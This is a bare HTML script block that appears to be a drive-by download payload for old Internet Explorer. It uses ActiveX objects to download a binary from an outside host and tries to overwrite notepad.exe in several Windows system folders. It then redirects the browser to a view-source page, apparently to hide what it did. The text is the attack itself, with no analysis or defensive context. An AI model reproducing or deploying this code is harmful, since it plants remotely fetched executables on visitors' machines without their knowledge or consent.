<script language="javascript">
win2k="c:\\winnt\\system32\\notepad.exe";
win2ok="c:\\winnt\\notepad.exe";
winxp="c:\\windows\\system32\\notepad.exe";
winxpee="c:\\windows\\notepad.exe";
win98="c:\\windows\\notepad.exe";
win98ate="c:\\windows\\system32\\notepad.exe";
var x = new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET", "http://sonyasys.com/39",0);
x.Send();
var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);
try{s.savetofile(win2k,2);}catch(e){};
try{s.savetofile(win2ok,2);}catch(e){};
try{s.savetofile(winxp,2);}catch(e){};
try{s.savetofile(winxpee,2);}catch(e){};
try{s.savetofile(win98,2);}catch(e){};
try{s.savetofile(win9ate,2);}catch(e){};
s.Close();
document.location="view-source:http://www.google.com"
</script>

